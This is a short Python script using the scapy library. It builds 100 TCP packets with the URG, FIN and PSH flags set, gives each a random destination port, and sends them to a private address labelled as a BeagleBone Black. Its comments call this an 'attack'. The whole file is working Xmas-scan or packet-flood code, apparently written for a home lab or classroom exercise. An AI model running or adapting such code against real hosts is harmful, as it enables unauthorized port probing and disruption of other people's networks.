from scapy.all import *
from scapy.arch.windows import compatibility
from scapy.all import log_runtime, MTU, ETH_P_ALL, PcapTimeoutElapsed, plist
compatibility.log_runtime = log_runtime
compatibility.MTU = MTU
compatibility.PcapTimeoutElapsed = PcapTimeoutElapsed
compatibility.ETH_P_ALL = ETH_P_ALL
compatibility.plist = plist
from random import randint

BBB = "192.168.7.2"
#Skeleton TCP packet with IP set to the BBB
skeleton_packet = IP(dst=BBB)/TCP()

#Turn on Urgent, Fin, Push
skeleton_packet[TCP].flags = "UFP"

#List to hold our packets
xmas_attack = []

#Loop to create a lot of packets
for packet_num in range(0,100):
  #Fill the list up with packets
  xmas_attack.extend(skeleton_packet)
  #Give a random port number to each packet
  xmas_attack[packet_num][TCP].dport = randint(1,65535)

#Send the list aka the attack
send(xmas_attack)
